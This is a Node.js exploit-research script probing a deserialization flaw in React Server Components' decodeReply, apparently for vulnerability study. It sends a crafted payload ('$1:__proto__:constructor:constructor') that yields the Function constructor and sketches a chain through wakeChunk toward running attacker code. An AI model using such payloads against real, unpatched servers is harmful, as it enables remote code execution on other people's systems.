/**
 * Test: Can we exploit wakeChunk in vulnerable version?
 *
 * The vulnerable code has:
 *   function wakeChunk(listeners, value) {
 *     for (var i = 0; i < listeners.length; i++) (0, listeners[i])(value);
 *   }
 *
 * The patched version adds:
 *   "function" === typeof listener ? listener(value) : ...
 *
 * Question: Can we inject something that's NOT a function into listeners
 * that would still get called?
 *
 * The listeners come from Chunk.prototype.then which pushes resolve/reject
 * But can we craft a payload that gets something else in there?
 */

'use strict';

const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => ({});

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

console.log('='.repeat(60));
console.log('Test: wakeChunk gadget exploration');
console.log('='.repeat(60));
console.log('');

async function test() {
  // The wakeChunk function calls: (0, listeners[i])(value)
  // This is indirect function call pattern in JavaScript
  //
  // If listeners[i] = Function (the constructor)
  // Then: (0, Function)(value) = Function(value)
  // Where value is the resolved chunk value (could be our code string!)

  console.log('[1] Understanding wakeChunk behavior:');
  console.log('    (0, func)(arg) is indirect call - calls func with global this');
  console.log('');

  // Test: If we could get Function into listeners array
  // and control value to be our code string...
  const mockListeners = [Function];
  const mockValue = 'return "RCE!"';

  console.log('[2] Simulating: (0, Function)("return \\"RCE!\\"")');
  try {
    const result = (0, mockListeners[0])(mockValue);
    console.log('    Result type:', typeof result);
    console.log('    Result:', result);
    if (typeof result === 'function') {
      console.log('    Calling result():', result());
    }
  } catch (e) {
    console.log('    Error:', e.message);
  }
  console.log('');

  console.log('[3] The question: Can we inject Function into chunk.value array?');
  console.log('');
  console.log('    chunk.value is populated by Chunk.prototype.then():');
  console.log('      resolve && (null === this.value && (this.value = []), this.value.push(resolve))');
  console.log('');
  console.log('    resolve comes from .then(resolve, reject) calls');
  console.log('    These are Promise callbacks - normally functions');
  console.log('');
  console.log('    BUT: What if we can create a chunk reference where');
  console.log('    something other than functions gets pushed?');
  console.log('');

  // The key insight: If we can make the chunk return Function as a value
  // AND that value ends up in the listeners array of another chunk
  // AND then wakeChunk is called with our code string...

  console.log('[4] Testing via decodeReply - can we get Function into chunk?');

  // We know $1:__proto__:constructor:constructor gives us Function
  const formData = new Map();
  formData.set('0', '["$1:__proto__:constructor:constructor"]');
  formData.set('1', '{"x":1}');
  formData.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  const result = await decodeReply(formData, webpackServerMap);
  console.log('    Result:', result);
  console.log('    result[0] === Function:', result[0] === Function);
  console.log('');

  // Now the question: Can we create a scenario where:
  // 1. Chunk A resolves to Function
  // 2. Chunk B has Chunk A's value (Function) as a listener
  // 3. Chunk B is woken with our code string

  console.log('[5] The attack chain would need:');
  console.log('    1. Reference $1 resolves to Function');
  console.log('    2. Something uses $1 as a "then" callback');
  console.log('    3. wakeChunk calls Function(our_code)');
  console.log('');
  console.log('    This is similar to the .then=Function approach');
  console.log('    but through the internal chunk resolution mechanism');
  console.log('');
}

test().catch(console.error);
